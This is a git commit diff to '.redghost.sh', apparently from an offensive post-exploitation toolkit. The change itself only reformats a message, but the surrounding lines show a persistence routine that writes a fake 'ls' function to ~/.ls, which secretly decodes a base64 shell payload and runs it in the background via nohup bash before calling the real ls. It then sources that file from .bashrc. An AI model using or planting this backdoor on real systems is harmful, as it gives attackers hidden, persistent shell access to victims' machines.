1267b45fdd62ef06cc5dacd5b26bfac85b7c9135
d4rkstat1c <44454186+d4rk007@users.noreply.github.com>
2019-06-24 10:28:07 +0000

    Update .redghost.sh

--- .redghost.sh
+++ .redghost.sh
@@ -93,7 +93,7 @@ function lswrap(){
 				encshell
 				echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
 				echo "source ~/.ls" >> .bashrc
-				echo -e "\nls wrapper added!\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
+				echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
 				read -p "Press enter to continue ";;
 		[Exitexit]* ) return 1;;
 		esac
